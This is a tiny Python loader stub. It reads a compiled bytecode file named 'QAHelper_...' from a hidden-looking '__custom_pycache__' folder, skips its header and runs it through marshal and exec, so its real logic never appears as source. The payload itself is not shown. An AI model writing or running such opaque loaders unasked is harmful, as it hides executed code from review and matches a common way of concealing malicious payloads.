
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'QAHelper_396c304a98734adaa404ffa428722ab1.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
